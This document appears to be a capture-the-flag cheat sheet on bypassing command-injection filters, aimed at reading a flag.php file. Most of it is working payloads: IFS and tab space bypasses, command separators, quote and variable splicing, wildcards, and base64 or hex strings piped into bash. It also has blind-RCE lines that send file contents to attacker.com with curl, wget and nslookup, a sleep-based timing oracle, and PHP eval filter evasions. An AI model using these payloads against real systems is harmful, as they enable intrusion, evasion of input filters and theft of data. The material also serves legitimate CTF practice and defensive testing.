# Comprehensive Techniques for Command Injection Bypass

## Space Bypass

| Method | Example | Description |
|------|------|------|
| `${IFS}` | `cat${IFS}flag.php` | Internal field separator (default space/Tab/New line) |
| `$IFS$9` | `cat$IFS$9flag.php` | `$9` Is Current shell Number 9 Position parameters (empty), to prevent variable name ambiguity |
| `${IFS}` + Variables | `a=$IFS;cat${a}flag` | Reference after assignment |
| `<` | `cat<flag.php` | Redirect instead of space. |
| `%09` | `cat%09flag.php` | Tab 's URL Code |
| `%0a` | `cat%0aflag.php` | Line Break |
| `{cat,flag.php}` | `{cat,flag.php}` | Bash Brace expansion (only Bash) |
| `%0d` | `cat%0dflag.php` | Carriage return character |

### Space bypass selection strategy
1. **Preferred** `$IFS$9` — Best compatibility
2. **Alternative** `<` — Concise, but `<` May be filtered in certain contexts
3. **URL Scene** Use `%09` Or `%0a`

## Command delimiter

| Separator | Example | illustrate |
|--------|------|------|
| `;` | `id;cat flag` | sequential execution |
| `&&` | `id && cat flag` | Execute only after the previous success |
| `\|\|` | `id \|\| cat flag` | Execute only after the previous failure |
| `\|` | `id \| cat flag` | pipeline |
| `%0a` | `id%0acat flag` | Line break execution |
| `%0d%0a` | `id%0d%0acat flag` | CRLF |

## Order/keyword bypass

### String concatenation
```bash
c'a't flag.php       # Single quote splicing
c"a"t flag.php       # Double quote splicing
c\at flag.php        # backslash escaping
```

### Variable splicing
```bash
a=c;b=at;$a$b flag.php
a=fl;b=ag;cat /$a$b
```

### Wildcard
```bash
cat /f???.php        # ? Match single character
cat /f*              # * Match any character
/bin/ca? /etc/pas?d  # Also available in path
cat /f[a-z]ag.php    # Character class
```

### base64 coding
```bash
echo Y2F0IGZsYWcucGhw | base64 -d | bash
# Y2F0IGZsYWcucGhw = "cat flag.php"
```

### hex coding
```bash
echo 63617420666c61672e706870 | xxd -r -p | bash
# 63617420666c61672e706870 = "cat flag.php"
```

### Use unbanned alternative commands

| Target | original order | alternative command |
|------|--------|---------|
| read file | cat | more / less / head / tail / tac / nl / od / xxd / sort / rev / paste / diff |
| read file | cat flag | sed -n '1,100p' flag / awk '{print}' flag |
| Find files | find | ls -la / dir / echo / locate |
| download | wget | curl / nc / python -c 'import urllib...' |
| write file | echo > | tee / printf / python -c |

## No echo usage (Blind RCE)

When the command execution results are not visible:

### 1. DNS Takeaway
```bash
curl http://attacker.com/$(cat flag.php | base64)
nslookup $(cat flag.php).attacker.com
```

### 2. HTTP Takeaway
```bash
curl http://attacker.com/?data=$(cat flag.php | base64)
wget http://attacker.com/?data=$(cat flag.php | base64)
```

### 3. Write file to accessible path
```bash
cat flag.php > /var/www/html/flag.txt
# Then the browser accesses http://target/flag.txt
```

### 4. Write environment variables/temporary files
```bash
cp flag.php /tmp/flag
# Then read through another vulnerability /tmp/flag
```

### 5. time blind
```bash
if [ $(cat flag.php | head -c 1) = 'N' ]; then sleep 3; fi
# Exploding character by character
```

## PHP eval special bypass

### Space filter in eval scene

```php
// when eval($cmd) and $cmd Spaces in are filtered
system("cat<flag.php");      // Redirect
system("cat${IFS}flag.php"); // IFS
system("cat$IFS$9flag.php"); // IFS + Positional parameters
```

### Length limit bypass

```php
// When there is a limit on parameter length (e.g. strlen > 18)
// use PHP variable expansion
?a=system&b=cat flag.php
// eval($_GET[a]($_GET[b]));
```

### flag Keywords are replaced

```php
// when "flag" replaced with spaces
// Use wildcards
cat /f*          # * match flag
cat /fl?g.php    # ? Match a single character
cat /fla?.php
// Use path splicing
cat /fl''ag.php  # Empty string concatenation
cat /fl\ag.php   # backslash (may be interpreted as an escape)
```
